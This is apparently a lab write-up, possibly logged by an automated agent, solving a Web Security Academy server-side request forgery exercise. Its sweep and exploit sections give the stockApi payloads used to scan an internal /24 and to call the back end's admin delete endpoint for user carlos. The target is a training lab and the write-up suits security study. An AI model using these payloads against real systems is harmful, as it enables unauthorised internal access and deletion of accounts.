## 2026-02-14 lab-basic-ssrf-against-backend-system (arm A)

Instance: https://0a0000c5045f549680778aad002a00c6.web-security-academy.net/ (fresh launch, reused:false, jar /tmp/cj1.json)
Widget lab id: 41B2FC5F623CE28DCC489F78C8F94EF2B7DE75258C86CFF17B68ECC861409328

### Target shape
- Product page carries `#stockCheckForm` -> POST /product/stock, body `stockApi=<url>`.
- Options point at the back end: `http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1`.
- SSRF is full-URL controllable; no allowlist.

### Sweep
- Piece: raw_matrix, template body `stockApi=http://192.168.0.{{V}}:8080/admin`, `--values @file`.
- raw_matrix never emits Content-Length, so the form body was inert until I added it explicitly.
  Digit width changes body length (37 + digits), so the sweep ran as three chunks with CL 38/39/40
  (values files /tmp/ssrf_v1.txt 1-9, v2 10-99, v3 100-254, generated by a sh_run loop).
- Baseline for an absent host: 500, 2454 bytes, identical digest 01838ca9ed4d842d.
- Divergence: **192.168.0.231** -> 200, 3245 bytes, marker "carlos" hit, Cache-Control no-cache.
  (192.168.0.1 replied 400 "Missing parameter" - it is the public app itself, not the admin.)

### Exploit
- POST /product/stock `stockApi=http://192.168.0.231:8080/admin` -> admin page listing wiener + carlos.
- POST /product/stock `stockApi=http://192.168.0.231:8080/admin/delete?username=carlos` -> 302 Location http://192.168.0.231:8080/admin.
- banner_verdict on the instance root: solved:true, solved_class:true, congrats line present.

### Lessons
- The stock check returns the back end's response verbatim: status/bytes/digest are a sufficient
  oracle for an IP sweep, so one matrix call maps the whole /24.
- A POST-with-body matrix variant needs an explicit Content-Length; per-digit-width chunks keep it exact.
- The back end's own copy of the app (here .1:8080) answers the sweep too - judge divergence, not error text.
